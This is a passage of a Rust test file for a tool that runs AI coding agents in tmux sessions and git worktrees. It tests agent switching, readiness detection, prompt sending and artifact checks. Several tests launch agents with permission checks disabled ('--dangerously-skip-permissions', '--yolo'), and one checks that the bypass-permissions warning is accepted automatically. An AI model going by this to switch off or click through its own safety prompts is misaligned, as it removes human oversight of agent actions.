#[cfg(feature = "test-mocks")]
fn test_cleanup_task_resources_kills_window_and_removes_worktree() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_kill_window()
        .times(1)
        .returning(|_| Ok(()));

    let mut mock_git = MockGitOperations::new();
    mock_git
        .expect_remove_worktree()
        .times(1)
        .returning(|_, _| Ok(()));

    cleanup_task_resources(
        "task-id",
        "claude",
        &Some("task/branch".to_string()),
        &Some("proj:task-win".to_string()),
        &Some("/tmp/wt".to_string()),
        None,
        Path::new("/tmp/proj"),
        &mock_tmux,
        &mock_git,
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_cleanup_task_resources_noop_when_no_session_or_worktree() {
    let mock_tmux = MockTmuxOperations::new();
    let mock_git = MockGitOperations::new();

    cleanup_task_resources(
        "task-id",
        "claude",
        &None,
        &None,
        &None,
        None,
        Path::new("/tmp/proj"),
        &mock_tmux,
        &mock_git,
    );
    // No panic = correct (no mock calls made)
}

// --- delete_task_resources ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_resources_kills_window_removes_worktree_and_deletes_branch() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_kill_window()
        .times(1)
        .returning(|_| Ok(()));

    let mut mock_git = MockGitOperations::new();
    mock_git
        .expect_remove_worktree()
        .times(1)
        .returning(|_, _| Ok(()));
    mock_git
        .expect_delete_branch()
        .times(1)
        .returning(|_, _| Ok(()));

    let mut task = make_test_task("t1", "Delete me", TaskStatus::Planning);
    task.session_name = Some("proj:task-win".to_string());
    task.worktree_path = Some("/tmp/wt".to_string());
    task.branch_name = Some("task/my-task".to_string());

    delete_task_resources(&task, None, Path::new("/tmp/proj"), &mock_tmux, &mock_git);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_resources_noop_when_no_session_or_worktree() {
    let mock_tmux = MockTmuxOperations::new();
    let mock_git = MockGitOperations::new();

    let task = make_test_task("t2", "Nothing to clean", TaskStatus::Backlog);
    // session_name and worktree_path both None → no mock calls
    delete_task_resources(&task, None, Path::new("/tmp/proj"), &mock_tmux, &mock_git);
}

// --- save_task ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_save_task_creates_new_task_in_db() {
    let mut app = make_test_app();

    app.state.wizard = Some(filled_wizard(
        "New Task Title",
        "Task description here",
        "agtx",
        None,
    ));

    app.save_task().unwrap();

    let tasks = app.state.db.as_ref().unwrap().get_all_tasks().unwrap();
    assert_eq!(tasks.len(), 1);
    let task = &tasks[0];
    assert_eq!(task.title, "New Task Title");
    assert_eq!(task.description.as_deref(), Some("Task description here"));
    assert_eq!(task.plugin.as_deref(), Some("agtx"));
    assert_eq!(task.status, TaskStatus::Backlog);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_save_task_updates_existing_task() {
    let mut app = make_test_app();

    // Create a task in the DB first
    let original = make_test_task("edit-me", "Original Title", TaskStatus::Backlog);
    app.state
        .db
        .as_ref()
        .unwrap()
        .create_task(&original)
        .unwrap();
    app.refresh_tasks().unwrap();

    app.state.wizard = Some(filled_wizard(
        "Updated Title",
        "Updated description",
        "gsd",
        Some("edit-me"),
    ));

    app.save_task().unwrap();

    let updated = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_task("edit-me")
        .unwrap()
        .unwrap();
    assert_eq!(updated.title, "Updated Title");
    assert_eq!(updated.description.as_deref(), Some("Updated description"));
    assert_eq!(updated.plugin.as_deref(), Some("gsd"));
    // Status unchanged
    assert_eq!(updated.status, TaskStatus::Backlog);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_save_task_empty_description_stored_as_none() {
    let mut app = make_test_app();

    app.state.wizard = Some(filled_wizard("Title only", "", "agtx", None));

    app.save_task().unwrap();

    let tasks = app.state.db.as_ref().unwrap().get_all_tasks().unwrap();
    assert_eq!(tasks[0].description, None);
}

// --- seed_plugin_step ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_seed_plugin_step_includes_agtx() {
    let mut app = make_test_app_with_agents();
    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
    app.seed_plugin_step();
    let names: Vec<String> = app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .plugin
        .options
        .iter()
        .map(|o| o.name.clone())
        .collect();
    assert!(names.iter().any(|n| n == "agtx"), "options={:?}", names);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_seed_plugin_step_sets_active_from_config() {
    let mut app = make_test_app_with_agents();
    app.state.config.workflow_plugin = Some("gsd".to_string());
    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
    app.seed_plugin_step();

    let active = app
        .state
        .wizard
        .as_ref()
        .unwrap()
        .plugin
        .options
        .iter()
        .find(|o| o.active);
    assert!(active.is_some());
    assert_eq!(active.unwrap().name, "gsd");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_seed_plugin_step_selected_index_matches_active() {
    let mut app = make_test_app_with_agents();
    app.state.config.workflow_plugin = Some("gsd".to_string());
    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
    app.seed_plugin_step();

    let idx = app.state.wizard.as_ref().unwrap().plugin.selected;
    assert!(
        app.state.wizard.as_ref().unwrap().plugin.options[idx].active,
        "selected idx {} not active",
        idx
    );
}

// =============================================================================
// Tests for switch_agent_in_tmux and wait_for_agent_ready
// =============================================================================

// --- switch_agent_in_tmux ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_claude_sends_exit_then_new_cmd() {
    // Claude: sends /exit, shell found immediately, then sends new agent cmd
    let mut mock_tmux = MockTmuxOperations::new();
    // /exit sent to current agent
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "/exit")
        .times(1)
        .returning(|_, _| Ok(()));
    // pane_current_command returns "bash" on first poll → shell found
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    // capture_pane returns empty content → no agent indicators → shell confirmed free
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));
    // new agent command sent after shell found
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT claude --dangerously-skip-permissions")
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(
        &mock_tmux,
        "proj:task",
        "claude",
        "claude --dangerously-skip-permissions",
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_codex_sends_ctrl_c_not_exit() {
    // Codex has no exit command — sends C-c instead
    let mut mock_tmux = MockTmuxOperations::new();
    // C-c via send_key (not send_keys)
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "C-c")
        .times(1)
        .returning(|_, _| Ok(()));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| {
            cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT codex --sandbox workspace-write"
        })
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(
        &mock_tmux,
        "proj:task",
        "codex",
        "codex --sandbox workspace-write",
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_retries_with_ctrl_c_when_shell_not_found() {
    // Shell not found on first 30 polls → retry path: sends C-c then /exit again
    let seq = std::sync::Arc::new(std::sync::Mutex::new(0u32));
    let seq2 = seq.clone();

    let mut mock_tmux = MockTmuxOperations::new();
    // Initial /exit
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "/exit")
        .returning(|_, _| Ok(()));
    // pane_current_command: returns "claude" for first 30 polls (shell not found),
    // then "bash" for the retry polls
    mock_tmux.expect_pane_current_command().returning(move |_| {
        let mut n = seq2.lock().unwrap();
        *n += 1;
        if *n <= 30 {
            Some("claude".to_string())
        } else {
            Some("bash".to_string())
        }
    });
    // capture_pane: no agent indicators in pane content
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));
    // C-c sent on retry
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "C-c")
        .times(1)
        .returning(|_, _| Ok(()));
    // new agent cmd always sent at end
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT newagent")
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(&mock_tmux, "proj:task", "claude", "newagent");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_sends_ctrl_d_as_last_resort() {
    // Shell never found → C-d last resort, but new agent cmd still sent
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "/exit")
        .returning(|_, _| Ok(()));
    // Always returns agent process — shell never found
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    // C-c on retry
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "C-c")
        .times(1)
        .returning(|_, _| Ok(()));
    // C-d as last resort
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "C-d")
        .times(1)
        .returning(|_, _| Ok(()));
    // new agent still sent
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT newagent")
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(&mock_tmux, "proj:task", "claude", "newagent");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_always_sends_new_agent_cmd() {
    // Even in worst case (shell never found), new agent cmd is sent
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "/exit")
        .returning(|_, _| Ok(()));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    // This is the key assertion — new_agent_cmd must be sent exactly once
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT my-new-agent")
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(&mock_tmux, "proj:task", "claude", "my-new-agent");
}

// --- wait_for_agent_ready ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_returns_when_process_detected() {
    // pane_current_command returns agent process immediately → exits loop on first check
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string())); // not shell → agent detected
                                                    // capture_pane called for settle, returning no indicator content
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    let result = wait_for_agent_ready(
        &(Arc::new(mock_tmux) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_returns_when_ready_indicator_in_pane() {
    // pane_current_command returns shell (bash), but pane content has ready indicator
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string())); // at shell
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("Type your message\n> ".to_string())); // Gemini ready indicator

    let result = wait_for_agent_ready(
        &(Arc::new(mock_tmux) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_handles_claude_bypass_prompt() {
    // Pane contains "Yes, I accept" → sends "2" + Enter and returns immediately
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("Yes, I accept\nSome prompt text".to_string()));
    // Must send "2" to accept. The mock pane never changes, which is exactly how
    // a dropped keystroke looks, so the answer is retried up to the cap.
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "2")
        .times(LAUNCH_DIALOG_MAX_ATTEMPTS as usize)
        .returning(|_, _| Ok(()));
    // Must send Enter to confirm
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "Enter")
        .times(LAUNCH_DIALOG_MAX_ATTEMPTS as usize)
        .returning(|_, _| Ok(()));

    let result = wait_for_agent_ready(
        &(Arc::new(mock_tmux) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_returns_when_content_stabilizes() {
    // Content changes 3 times then stays stable for CONTENT_STABLE_THRESHOLD ticks
    let call_count = std::sync::Arc::new(std::sync::Mutex::new(0u32));
    let call_count2 = call_count.clone();

    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string())); // always at shell

    mock_tmux.expect_capture_pane().returning(move |_| {
        let mut n = call_count2.lock().unwrap();
        *n += 1;
        // 3 changes (different content), then stable
        match *n {
            1 => Ok("loading 1".to_string()),
            2 => Ok("loading 2".to_string()),
            3 => Ok("loading 3".to_string()),
            _ => Ok("stable content".to_string()), // unchanged → stable_ticks increment
        }
    });

    let result = wait_for_agent_ready(
        &(Arc::new(mock_tmux) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_always_returns_some() {
    // Even if loop exhausts (150 iters), always returns Some
    // Simulate: always at shell, content never changes, change_count stays 0
    // → stable_ticks never counted → loop runs to completion
    // We only run a minimal version: content changes 0 times → loop exits at 150
    // With mocks this is instant.
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("same content forever".to_string()));

    // Loop runs all 150 iters with no content change → change_count=0, stable never triggered
    // Function always returns Some at end regardless.
    let result = wait_for_agent_ready(
        &(Arc::new(mock_tmux) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

// =============================================================================
// Tests for is_pane_at_shell and is_agent_active
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_shell_process() {
    for shell in &["bash", "zsh", "sh", "fish"] {
        let mut mock = MockTmuxOperations::new();
        let shell_str = shell.to_string();
        mock.expect_pane_current_command()
            .returning(move |_| Some(shell_str.clone()));
        assert!(
            is_pane_at_shell(&mock, "t"),
            "should be at shell for {}",
            shell
        );
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_false_for_agent_processes() {
    for agent in &["claude", "codex", "gemini", "copilot", "opencode", "agent"] {
        let mut mock = MockTmuxOperations::new();
        let agent_str = agent.to_string();
        mock.expect_pane_current_command()
            .returning(move |_| Some(agent_str.clone()));
        assert!(
            !is_pane_at_shell(&mock, "t"),
            "should not be at shell for {}",
            agent
        );
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_detects_claude_via_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string())); // node/bash — Check 1 misses
    mock.expect_capture_pane()
        .returning(|_| Ok("Claude Code v2.1.72\n> ".to_string()));
    assert!(
        is_agent_active(&mock, "t", None),
        "Claude Code indicator should trigger is_agent_active"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_detects_gemini_via_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("some output\nType your message".to_string()));
    assert!(
        is_agent_active(&mock, "t", None),
        "Gemini indicator should trigger is_agent_active"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_detects_opencode_via_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("some output\nAsk anything".to_string()));
    assert!(
        is_agent_active(&mock, "t", None),
        "OpenCode indicator should trigger is_agent_active"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_detects_cursor_via_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("some output\nCursor Agent\n> ".to_string()));
    assert!(
        is_agent_active(&mock, "t", None),
        "Cursor indicator should trigger is_agent_active"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_detects_codex_via_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("some output\nOpenAI Codex".to_string()));
    assert!(
        is_agent_active(&mock, "t", None),
        "Codex indicator should trigger is_agent_active"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agent_active_returns_false_when_no_indicator() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("just some shell output".to_string()));
    assert!(
        !is_agent_active(&mock, "t", None),
        "no indicator should return false"
    );
}

// =============================================================================
// Tests for wait_for_agent_ready — new ready indicators
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_claude_via_banner() {
    // node process (asdf install) — Check 1 misses, Check 2 fires on "Claude Code"
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("Claude Code v2.1.72\nsome context".to_string()));
    let result = wait_for_agent_ready(
        &(Arc::new(mock) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_cursor_via_banner() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("Cursor Agent\n> ".to_string()));
    let result = wait_for_agent_ready(
        &(Arc::new(mock) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_opencode_via_banner() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("Ask anything\n> ".to_string()));
    let result = wait_for_agent_ready(
        &(Arc::new(mock) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wait_for_agent_ready_detects_codex_via_banner() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("OpenAI Codex\nsome output".to_string()));
    let result = wait_for_agent_ready(
        &(Arc::new(mock) as Arc<dyn TmuxOperations>),
        "proj:task",
        None,
        true,
    );
    assert_eq!(result, Some("proj:task".to_string()));
}

// =============================================================================
// Tests for switch_agent_in_tmux — cursor exit behavior
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_cursor_sends_ctrl_c_not_exit() {
    // Cursor is an Ink/Node TUI — uses Ctrl+C to exit, no /exit command
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_send_key()
        .withf(|_, key: &str| key == "C-c")
        .times(1)
        .returning(|_, _| Ok(()));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));
    mock_tmux
        .expect_send_keys()
        .withf(|_, cmd: &str| cmd == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT agent --yolo")
        .times(1)
        .returning(|_, _| Ok(()));

    switch_agent_in_tmux(&mock_tmux, "proj:task", "cursor", "agent --yolo");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_opencode_sends_exit() {
    // OpenCode uses /exit (like Claude), not /quit or Ctrl+C
    let mut mock_tmux = MockTmuxOperations::new();
    let exit_sent = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let exit_sent_c = exit_sent.clone();
    mock_tmux.expect_send_keys().returning(move |_, cmd| {
        if cmd == "/exit" {
            exit_sent_c.store(true, std::sync::atomic::Ordering::SeqCst);
        }
        Ok(())
    });
    mock_tmux.expect_send_key().returning(|_, _| Ok(()));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok(String::new()));

    switch_agent_in_tmux(&mock_tmux, "proj:task", "opencode", "opencode");
    assert!(
        exit_sent.load(std::sync::atomic::Ordering::SeqCst),
        "/exit should be sent for opencode"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_opencode_combined_with_double_enter() {
    // OpenCode: skill+prompt combined into single message, then a second Enter to submit
    // after a short delay (command picker closes immediately on first Enter)
    let mut mock = MockTmuxOperations::new();
    let literal_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let literal_c = literal_calls.clone();
    let texts = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let texts_c = texts.clone();

    mock.expect_send_key().returning(move |_, text| {
        literal_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    // The message itself is text, so it goes through send_text (`send-keys -l`);
    // only the Enters are keys.
    mock.expect_send_text().returning(move |_, text| {
        texts_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    expect_echoing_pane(&mut mock, "/agtx-plan\n\ndo the thing");

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx-plan".to_string()),
        "do the thing",
        &None,
        "do the thing",
        "opencode",
        &[],
        false,
    );
    let sent = texts.lock().unwrap();
    // Combined message sent
    assert!(
        sent.iter()
            .any(|c| c.contains("/agtx-plan") && c.contains("do the thing")),
        "skill+prompt should be combined for opencode"
    );
    let calls = literal_calls.lock().unwrap();
    // Two Enters sent (first to close picker, second to submit)
    assert_eq!(
        calls.iter().filter(|c| c.as_str() == "Enter").count(),
        2,
        "opencode should send two Enters (close picker + submit)"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_send_skill_and_prompt_cursor_combined_single_enter() {
    // Cursor: skill+prompt combined into one bracketed paste, one Enter to submit.
    let mut mock = MockTmuxOperations::new();
    let literal_calls = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let literal_c = literal_calls.clone();
    let pastes = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let pastes_c = pastes.clone();

    mock.expect_send_key().returning(move |_, text| {
        literal_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    mock.expect_paste_text().returning(move |_, text| {
        pastes_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    expect_echoing_pane(&mut mock, "/agtx-plan\n\nmy task");

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx-plan".to_string()),
        "my task",
        &None,
        "my task",
        "cursor",
        &[],
        false,
    );
    let pasted = pastes.lock().unwrap();
    assert_eq!(pasted.len(), 1, "exactly one paste");
    assert!(
        pasted[0].contains("/agtx-plan") && pasted[0].contains("my task"),
        "skill+prompt should be combined for cursor"
    );
    // Only one Enter (cursor has no command picker)
    let calls = literal_calls.lock().unwrap();
    assert_eq!(
        calls.iter().filter(|c| c.as_str() == "Enter").count(),
        1,
        "cursor should send only one Enter"
    );
}

#[test]
fn test_write_skills_to_worktree_cursor() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], false);

    // Cursor uses subdirectories with SKILL.md (same structure as Codex)
    assert!(
        dir.path()
            .join(".cursor/skills/agtx-plan/SKILL.md")
            .exists(),
        ".cursor/skills/agtx-plan/SKILL.md should exist"
    );
    assert!(
        dir.path()
            .join(".cursor/skills/agtx-execute/SKILL.md")
            .exists(),
        ".cursor/skills/agtx-execute/SKILL.md should exist"
    );
}

// =============================================================================
// Tests for artifact_path_exists
// =============================================================================

#[test]
fn test_artifact_path_exists_zero_padded() {
    // Zero-padded path "01/PLAN.md" found on first try
    let dir = tempfile::tempdir().unwrap();
    let phase_dir = dir.path().join("01");
    std::fs::create_dir_all(&phase_dir).unwrap();
    std::fs::write(phase_dir.join("PLAN.md"), "plan").unwrap();

    assert!(
        artifact_path_exists(&dir.path().to_string_lossy(), "{phase}/PLAN.md", 1),
        "should find zero-padded path 01/PLAN.md for cycle 1"
    );
}

#[test]
fn test_artifact_path_exists_non_padded_fallback() {
    // Non-padded path "1/PLAN.md" found on second try (zero-padded "01" missing)
    let dir = tempfile::tempdir().unwrap();
    let phase_dir = dir.path().join("1");
    std::fs::create_dir_all(&phase_dir).unwrap();
    std::fs::write(phase_dir.join("PLAN.md"), "plan").unwrap();

    assert!(
        artifact_path_exists(&dir.path().to_string_lossy(), "{phase}/PLAN.md", 1),
        "should fall back to non-padded path 1/PLAN.md when 01 is missing"
    );
}

#[test]
fn test_artifact_path_exists_cycle_2_zero_padded() {
    // Cycle 2 → checks "02/PLAN.md" first
    let dir = tempfile::tempdir().unwrap();
    let phase_dir = dir.path().join("02");
    std::fs::create_dir_all(&phase_dir).unwrap();
    std::fs::write(phase_dir.join("PLAN.md"), "plan").unwrap();

    assert!(
        artifact_path_exists(&dir.path().to_string_lossy(), "{phase}/PLAN.md", 2),
        "cycle 2 should match 02/PLAN.md"
    );
    assert!(
        !artifact_path_exists(&dir.path().to_string_lossy(), "{phase}/PLAN.md", 1),
        "cycle 1 should not match 02/PLAN.md"
    );
}

#[test]
fn test_artifact_path_exists_no_phase_placeholder() {
    // Template without {phase} — plain file existence check
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("CONTEXT.md"), "ctx").unwrap();

    assert!(
        artifact_path_exists(&dir.path().to_string_lossy(), "CONTEXT.md", 1),
        "should find plain file with no {{phase}} placeholder"
    );
    assert!(
        !artifact_path_exists(&dir.path().to_string_lossy(), "MISSING.md", 1),
        "should return false for missing plain file"
    );
}

#[test]
fn test_artifact_path_exists_glob_pattern() {
    // Template with wildcard — e.g. "{phase}-CONTEXT.md"
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("01-CONTEXT.md"), "ctx").unwrap();

    assert!(
        artifact_path_exists(&dir.path().to_string_lossy(), "{phase}-CONTEXT.md", 1),
        "wildcard pattern should match 01-CONTEXT.md for cycle 1"
    );
    assert!(
        !artifact_path_exists(&dir.path().to_string_lossy(), "{phase}-CONTEXT.md", 2),
        "wildcard pattern should not match cycle 2 when only cycle 1 file exists"
    );
}

// =============================================================================
// Tests for research_artifact_exists
// =============================================================================

#[test]
fn test_research_artifact_exists_no_plugin() {
    // No plugin → always false
    let dir = tempfile::tempdir().unwrap();
    assert!(
        !research_artifact_exists(&dir.path().to_string_lossy(), "task-123", &None),
        "no plugin should return false"
    );
}

#[test]
fn test_research_artifact_exists_no_artifact_in_plugin() {
    // Plugin with no research artifact configured → false
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"name = "myplugin"
           [commands]
           [prompts]
           [artifacts]"#,
    )
    .unwrap();

    let dir = tempfile::tempdir().unwrap();
    assert!(
        !research_artifact_exists(&dir.path().to_string_lossy(), "task-123", &Some(plugin)),
        "plugin with no research artifact should return false"
    );
}

#[test]
fn test_research_artifact_exists_file_present() {
    // Plugin has research artifact template with {task_id} — file exists
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"name = "myplugin"
           [commands]
           [prompts]
           [artifacts]
           research = ".planning/{task_id}-CONTEXT.md""#,
    )
    .unwrap();

    let dir = tempfile::tempdir().unwrap();
    let planning_dir = dir.path().join(".planning");
    std::fs::create_dir_all(&planning_dir).unwrap();
    std::fs::write(planning_dir.join("task-123-CONTEXT.md"), "ctx").unwrap();

    assert!(
        research_artifact_exists(&dir.path().to_string_lossy(), "task-123", &Some(plugin)),
        "should find artifact when file matching {{task_id}} template exists"
    );
}

#[test]
fn test_research_artifact_exists_file_missing() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"name = "myplugin"
           [commands]
           [prompts]
           [artifacts]
           research = ".planning/{task_id}-CONTEXT.md""#,
    )
    .unwrap();

    let dir = tempfile::tempdir().unwrap();
    assert!(
        !research_artifact_exists(&dir.path().to_string_lossy(), "task-123", &Some(plugin)),
        "should return false when artifact file is missing"
    );
}

// =============================================================================
// Tests for deploy_skill
// =============================================================================

#[test]
fn test_deploy_skill_writes_canonical_path() {
    let dir = tempfile::tempdir().unwrap();
    let content = "---\nname: agtx-plan\ndescription: Plan\n---\nPlan the work.";

    deploy_skill(dir.path(), "agtx-plan", content, "claude");

    assert!(
